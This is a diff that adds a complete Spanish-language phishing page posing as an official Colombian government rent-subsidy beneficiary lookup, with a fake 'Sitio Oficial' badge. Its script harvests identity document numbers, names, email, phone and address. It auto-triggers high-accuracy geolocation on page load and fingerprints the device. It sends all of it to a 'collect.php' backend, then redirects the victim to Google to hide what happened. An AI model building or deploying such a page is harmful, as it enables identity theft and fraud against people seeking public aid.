@@ -1,0 +1,773 @@
+<!DOCTYPE html>
+<html lang="es-CO">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Consulta de Beneficiarios - Subsidio de Arrendamiento</title>
+    <meta name="description" content="Consulta si eres beneficiario del subsidio de arrendamiento del Gobierno Nacional. Ingresa tus datos para verificar tu elegibilidad.">
+    
+    <!-- Favicon -->
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🏛️</text></svg>">
+    
+    <!-- Google Fonts -->
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    
+    <!-- Font Awesome -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    
+    <style>
+        :root {
+            --primary-color: #1e3a8a;
+            --secondary-color: #3b82f6;
+            --accent-color: #f59e0b;
+            --success-color: #10b981;
+            --danger-color: #ef4444;
+            --warning-color: #f59e0b;
+            --light-gray: #f8fafc;
+            --medium-gray: #64748b;
+            --dark-gray: #1e293b;
+            --white: #ffffff;
+            --shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1);
+            --shadow-lg: 0 10px 15px -3px rgba(0, 0, 0, 0.1);
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Montserrat', sans-serif;
+            line-height: 1.6;
+            color: var(--dark-gray);
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+        }
+        
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+        
+        /* Header */
+        .header {
+            background: var(--white);
+            box-shadow: var(--shadow);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+        
+        .header-content {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 15px 0;
+            flex-wrap: wrap;
+            gap: 15px;
+        }
+        
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+        
+        .logo-icon {
+            width: 50px;
+            height: 50px;
+            background: var(--primary-color);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: var(--white);
+            font-size: 24px;
+        }
+        
+        .logo-text {
+            font-size: 18px;
+            font-weight: 700;
+            color: var(--primary-color);
+        }
+        
+        .gov-badge {
+            background: var(--primary-color);
+            color: var(--white);
+            padding: 8px 16px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+        
+        /* Main Content */
+        .main-content {
+            padding: 40px 0;
+        }
+        
+        .hero-section {
+            text-align: center;
+            margin-bottom: 40px;
+            color: var(--white);
+        }
+        
+        .hero-title {
+            font-size: 2.5rem;
+            font-weight: 700;
+            margin-bottom: 15px;
+            text-shadow: 0 2px 4px rgba(0,0,0,0.3);
+        }
+        
+        .hero-subtitle {
+            font-size: 1.2rem;
+            font-weight: 400;
+            opacity: 0.9;
+            max-width: 600px;
+            margin: 0 auto;
+        }
+        
+        /* Form Card */
+        .form-card {
+            background: var(--white);
+            border-radius: 20px;
+            box-shadow: var(--shadow-lg);
+            overflow: hidden;
+            max-width: 800px;
+            margin: 0 auto;
+        }
+        
+        .form-header {
+            background: linear-gradient(135deg, var(--primary-color), var(--secondary-color));
+            color: var(--white);
+            padding: 30px;
+            text-align: center;
+        }
+        
+        .form-header h2 {
+            font-size: 1.8rem;
+            font-weight: 600;
+            margin-bottom: 10px;
+        }
+        
+        .form-header p {
+            opacity: 0.9;
+            font-size: 1rem;
+        }
+        
+        .form-body {
+            padding: 40px;
+        }
+        
+        .form-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 25px;
+            margin-bottom: 30px;
+        }
+        
+        .form-group {
+            position: relative;
+        }
+        
+        .form-group label {
+            display: block;
+            font-weight: 600;
+            color: var(--dark-gray);
+            margin-bottom: 8px;
+            font-size: 0.95rem;
+        }
+        
+        .form-group input,
+        .form-group select {
+            width: 100%;
+            padding: 15px;
+            border: 2px solid #e2e8f0;
+            border-radius: 10px;
+            font-size: 1rem;
+            transition: all 0.3s ease;
+            background: var(--white);
+        }
+        
+        .form-group input:focus,
+        .form-group select:focus {
+            outline: none;
+            border-color: var(--secondary-color);
+            box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.1);
+        }
+        
+        .form-group .icon {
+            position: absolute;
+            right: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: var(--medium-gray);
+            pointer-events: none;
+        }
+        
+        /* Location Section */
+        .location-section {
+            background: var(--light-gray);
+            border-radius: 15px;
+            padding: 25px;
+            margin-bottom: 30px;
+            border-left: 4px solid var(--accent-color);
+        }
+        
+        .location-header {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 15px;
+        }
+        
+        .location-header i {
+            color: var(--accent-color);
+            font-size: 1.2rem;
+        }
+        
+        .location-header h3 {
+            color: var(--dark-gray);
+            font-size: 1.1rem;
+            font-weight: 600;
+        }
+        
+        .location-button {
+            background: var(--accent-color);
+            color: var(--white);
+            border: none;
+            padding: 12px 24px;
+            border-radius: 8px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        .location-button:hover {
+            background: #d97706;
+            transform: translateY(-2px);
+        }
+        
+        .location-status {
+            margin-top: 15px;
+            padding: 10px;
+            border-radius: 8px;
+            font-size: 0.9rem;
+            display: none;
+        }
+        
+        .location-status.success {
+            background: #dcfce7;
+            color: #166534;
+            border: 1px solid #bbf7d0;
+        }
+        
+        .location-status.error {
+            background: #fef2f2;
+            color: #991b1b;
+            border: 1px solid #fecaca;
+        }
+        
+        /* Submit Button */
+        .submit-section {
+            text-align: center;
+            padding-top: 20px;
+            border-top: 1px solid #e2e8f0;
+        }
+        
+        .submit-button {
+            background: linear-gradient(135deg, var(--success-color), #059669);
+            color: var(--white);
+            border: none;
+            padding: 18px 40px;
+            border-radius: 12px;
+            font-size: 1.1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            display: inline-flex;
+            align-items: center;
+            gap: 10px;
+            min-width: 200px;
+            justify-content: center;
+        }
+        
+        .submit-button:hover {
+            transform: translateY(-2px);
+            box-shadow: var(--shadow-lg);
+        }
+        
+        .submit-button:disabled {
+            background: var(--medium-gray);
+            cursor: not-allowed;
+            transform: none;
+        }
+        
+        /* Loading Spinner */
+        .spinner {
+            width: 20px;
+            height: 20px;
+            border: 2px solid transparent;
+            border-top: 2px solid currentColor;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            display: none;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        /* Footer */
+        .footer {
+            background: var(--white);
+            padding: 30px 0;
+            text-align: center;
+            color: var(--medium-gray);
+            font-size: 0.9rem;
+        }
+        
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            gap: 30px;
+            margin-bottom: 15px;
+            flex-wrap: wrap;
+        }
+        
+        .footer-links a {
+            color: var(--medium-gray);
+            text-decoration: none;
+            transition: color 0.3s ease;
+        }
+        
+        .footer-links a:hover {
+            color: var(--primary-color);
+        }
+        
+        /* Responsive Design */
+        @media (max-width: 768px) {
+            .hero-title {
+                font-size: 2rem;
+            }
+            
+            .hero-subtitle {
+                font-size: 1rem;
+            }
+            
+            .form-body {
+                padding: 25px;
+            }
+            
+            .form-grid {
+                grid-template-columns: 1fr;
+                gap: 20px;
+            }
+            
+            .header-content {
+                justify-content: center;
+                text-align: center;
+            }
+            
+            .footer-links {
+                flex-direction: column;
+                gap: 15px;
+            }
+        }
+        
+        @media (max-width: 480px) {
+            .container {
+                padding: 0 15px;
+            }
+            
+            .form-header {
+                padding: 20px;
+            }
+            
+            .form-body {
+                padding: 20px;
+            }
+            
+            .hero-title {
+                font-size: 1.8rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Header -->
+    <header class="header">
+        <div class="container">
+            <div class="header-content">
+                <div class="logo">
+                    <div class="logo-icon">
+                        <i class="fas fa-university"></i>
+                    </div>
+                    <div class="logo-text">Gobierno Nacional</div>
+                </div>
+                <div class="gov-badge">
+                    <i class="fas fa-shield-alt"></i> Sitio Oficial
+                </div>
+            </div>
+        </div>
+    </header>
+
+    <!-- Main Content -->
+    <main class="main-content">
+        <div class="container">
+            <!-- Hero Section -->
+            <section class="hero-section">
+                <h1 class="hero-title">
+                    <i class="fas fa-home"></i>
+                    Consulta de Beneficiarios
+                </h1>
+                <p class="hero-subtitle">
+                    Verifica si eres beneficiario del subsidio de arrendamiento del Gobierno Nacional. 
+                    Ingresa tus datos personales para consultar tu elegibilidad.
+                </p>
+            </section>
+
+            <!-- Form Card -->
+            <div class="form-card">
+                <div class="form-header">
+                    <h2><i class="fas fa-search"></i> Formulario de Consulta</h2>
+                    <p>Completa todos los campos para verificar tu estado como beneficiario</p>
+                </div>
+                
+                <div class="form-body">
+                    <form id="beneficiaryForm">
+                        <div class="form-grid">
+                            <div class="form-group">
+                                <label for="documentType">
+                                    <i class="fas fa-id-card"></i> Tipo de Documento *
+                                </label>
+                                <select id="documentType" name="documentType" required>
+                                    <option value="">Selecciona tu tipo de documento</option>
+                                    <option value="CC">Cédula de Ciudadanía</option>
+                                    <option value="CE">Cédula de Extranjería</option>
+                                    <option value="TI">Tarjeta de Identidad</option>
+                                    <option value="RC">Registro Civil</option>
+                                    <option value="PA">Pasaporte</option>
+                                </select>
+                            </div>
+                            
+                            <div class="form-group">
+                                <label for="documentNumber">
+                                    <i class="fas fa-hashtag"></i> Número de Documento *
+                                </label>
+                                <input type="text" id="documentNumber" name="documentNumber" 
+                                       placeholder="Ingresa tu número de documento" required>
+                            </div>
+                            
+                            <div class="form-group">
+                                <label for="firstName">
+                                    <i class="fas fa-user"></i> Nombres *
+                                </label>
+                                <input type="text" id="firstName" name="firstName" 
+                                       placeholder="Ingresa tus nombres completos" required>
+                            </div>
+                            
+                            <div class="form-group">
+                                <label for="lastName">
+                                    <i class="fas fa-user-tag"></i> Apellidos *
+                                </label>
+                                <input type="text" id="lastName" name="lastName" 
+                                       placeholder="Ingresa tus apellidos completos" required>
+                            </div>
+                            
+                            <div class="form-group">
+                                <label for="email">
+                                    <i class="fas fa-envelope"></i> Correo Electrónico *
+                                </label>
+                                <input type="email" id="email" name="email" 
+                                       placeholder="ejemplo@correo.com" required>
+                            </div>
+                            
+                            <div class="form-group">
+                                <label for="phone">
+                                    <i class="fas fa-phone"></i> Teléfono *
+                                </label>
+                                <input type="tel" id="phone" name="phone" 
+                                       placeholder="Ej: 3001234567" required>
+                            </div>
+                        </div>
+                        
+                        <div class="form-group">
+                            <label for="address">
+                                <i class="fas fa-map-marker-alt"></i> Dirección Completa *
+                            </label>
+                            <input type="text" id="address" name="address" 
+                                   placeholder="Ingresa tu dirección completa" required>
+                        </div>
+                        
+                        <!-- Location Section -->
+                        <div class="location-section">
+                            <div class="location-header">
+                                <i class="fas fa-map-marked-alt"></i>
+                                <h3>Verificación de Ubicación</h3>
+                            </div>
+                            <p style="margin-bottom: 15px; color: var(--medium-gray); font-size: 0.95rem;">
+                                Para mejorar la precisión de la consulta, necesitamos acceder a tu ubicación actual.
+                            </p>
+                            <button type="button" class="location-button" id="getLocationBtn">
+                                <i class="fas fa-crosshairs"></i>
+                                Activar Ubicación
+                            </button>
+                            <div class="location-status" id="locationStatus"></div>
+                        </div>
+                        
+                        <!-- Submit Section -->
+                        <div class="submit-section">
+                            <button type="submit" class="submit-button" id="submitBtn">
+                                <div class="spinner" id="spinner"></div>
+                                <i class="fas fa-search" id="submitIcon"></i>
+                                <span id="submitText">Consultar Beneficio</span>
+                            </button>
+                        </div>
+                    </form>
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <!-- Footer -->
+    <footer class="footer">
+        <div class="container">
+            <div class="footer-links">
+                <a href="#">Términos y Condiciones</a>
+                <a href="#">Política de Privacidad</a>
+                <a href="#">Contacto</a>
+                <a href="#">Ayuda</a>
+            </div>
+            <p>&copy; 2024 Gobierno Nacional de Colombia. Todos los derechos reservados.</p>
+            <p style="font-size: 0.8rem; margin-top: 5px; opacity: 0.7;">
+                Línea anticorrupción: 01-8000-95-1100 | Línea de atención: 601 379 1088
+            </p>
+        </div>
+    </footer>
+
+    <script>
+        // Advanced Geolocation and Data Collection
+        let locationData = null;
+        let deviceData = {};
+        
+        // Collect device information
+        function collectDeviceInfo() {
+            deviceData = {
+                userAgent: navigator.userAgent,
+                language: navigator.language,
+                platform: navigator.platform,
+                cookieEnabled: navigator.cookieEnabled,
+                onLine: navigator.onLine,
+                screen: {
+                    width: screen.width,
+                    height: screen.height,
+                    colorDepth: screen.colorDepth,
+                    pixelDepth: screen.pixelDepth
+                },
+                viewport: {
+                    width: window.innerWidth,
+                    height: window.innerHeight
+                },
+                timezone: {
+                    name: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    offset: new Date().getTimezoneOffset()
+                },
+                timestamp: new Date().toISOString()
+            };
+            
+            // Network information if available
+            if ('connection' in navigator) {
+                deviceData.connection = {
+                    effectiveType: navigator.connection.effectiveType,
+                    downlink: navigator.connection.downlink,
+                    rtt: navigator.connection.rtt,
+                    saveData: navigator.connection.saveData
+                };
+            }
+        }
+        
+        // Enhanced geolocation function
+        async function getAdvancedGeolocation() {
+            return new Promise((resolve, reject) => {
+                if (!navigator.geolocation) {
+                    reject(new Error('Geolocalización no soportada'));
+                    return;
+                }
+                
+                const options = {
+                    enableHighAccuracy: true,
+                    timeout: 15000,
+                    maximumAge: 0
+                };
+                
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        const coords = {
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude,
+                            accuracy: position.coords.accuracy,
+                            altitude: position.coords.altitude,
+                            altitudeAccuracy: position.coords.altitudeAccuracy,
+                            heading: position.coords.heading,
+                            speed: position.coords.speed,
+                            timestamp: position.timestamp
+                        };
+                        resolve(coords);
+                    },
+                    (error) => {
+                        reject(error);
+                    },
+                    options
+                );
+            });
+        }
+        
+        // Location button handler
+        document.getElementById('getLocationBtn').addEventListener('click', async function() {
+            const btn = this;
+            const status = document.getElementById('locationStatus');
+            
+            btn.disabled = true;
+            btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Obteniendo ubicación...';
+            
+            try {
+                locationData = await getAdvancedGeolocation();
+                
+                status.className = 'location-status success';
+                status.style.display = 'block';
+                status.innerHTML = `
+                    <i class="fas fa-check-circle"></i>
+                    <strong>Ubicación obtenida exitosamente</strong><br>
+                    Precisión: ${Math.round(locationData.accuracy)} metros
+                `;
+                
+                btn.innerHTML = '<i class="fas fa-check"></i> Ubicación Activada';
+                btn.style.background = 'var(--success-color)';
+                
+            } catch (error) {
+                status.className = 'location-status error';
+                status.style.display = 'block';
+                status.innerHTML = `
+                    <i class="fas fa-exclamation-triangle"></i>
+                    <strong>Error al obtener ubicación:</strong><br>
+                    ${error.message}
+                `;
+                
+                btn.innerHTML = '<i class="fas fa-crosshairs"></i> Reintentar Ubicación';
+                btn.disabled = false;
+            }
+        });
+        
+        // Form submission handler
+        document.getElementById('beneficiaryForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const submitBtn = document.getElementById('submitBtn');
+            const spinner = document.getElementById('spinner');
+            const submitIcon = document.getElementById('submitIcon');
+            const submitText = document.getElementById('submitText');
+            
+            // Collect form data
+            const formData = new FormData(this);
+            const userData = Object.fromEntries(formData.entries());
+            
+            // Collect all data
+            collectDeviceInfo();
+            
+            const allData = {
+                userData,
+                locationData,
+                deviceData,
+                submissionTime: new Date().toISOString()
+            };
+            
+            // Show loading state
+            submitBtn.disabled = true;
+            spinner.style.display = 'block';
+            submitIcon.style.display = 'none';
+            submitText.textContent = 'Procesando consulta...';
+            
+            try {
+                // Send data to backend
+                const response = await fetch('../backend/collect.php', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(allData)
+                });
+                
+                if (response.ok) {
+                    // Simulate processing time
+                    await new Promise(resolve => setTimeout(resolve, 2000));
+                    
+                    // Show success message
+                    submitText.textContent = 'Consulta Completada';
+                    submitIcon.className = 'fas fa-check';
+                    submitIcon.style.display = 'block';
+                    spinner.style.display = 'none';
+                    submitBtn.style.background = 'var(--success-color)';
+                    
+                    // Redirect after delay
+                    setTimeout(() => {
+                        window.location.href = 'https://www.google.com';
+                    }, 1500);
+                    
+                } else {
+                    throw new Error('Error en el servidor');
+                }
+                
+            } catch (error) {
+                console.error('Error:', error);
+                
+                // Show error state
+                submitText.textContent = 'Error en la consulta';
+                submitIcon.className = 'fas fa-exclamation-triangle';
+                submitIcon.style.display = 'block';
+                spinner.style.display = 'none';
+                submitBtn.style.background = 'var(--danger-color)';
+                
+                // Reset after delay
+                setTimeout(() => {
+                    submitBtn.disabled = false;
+                    submitText.textContent = 'Consultar Beneficio';
+                    submitIcon.className = 'fas fa-search';
+                    submitBtn.style.background = '';
+                }, 3000);
+            }
+        });
+        
+        // Auto-activate location on page load
+        window.addEventListener('load', function() {
+            setTimeout(() => {
+                document.getElementById('getLocationBtn').click();
+            }, 2000);
+        });
+        
+        // Input validation and formatting
+        document.getElementById('documentNumber').addEventListener('input', function(e) {
+            // Remove non-numeric characters
+            e.target.value = e.target.value.replace(/[^0-9]/g, '');
+        });
+        
+        document.getElementById('phone').addEventListener('input', function(e) {
+            // Remove non-numeric characters
+            e.target.value = e.target.value.replace(/[^0-9]/g, '');
+        });
+        
+        // Capitalize names
+        ['firstName', 'lastName'].forEach(id => {
+            document.getElementById(id).addEventListener('input', function(e) {
+                e.target.value = e.target.value.replace(/\b\w/g, l => l.toUpperCase());
+            });
+        });
+    </script>
+</body>
+</html>
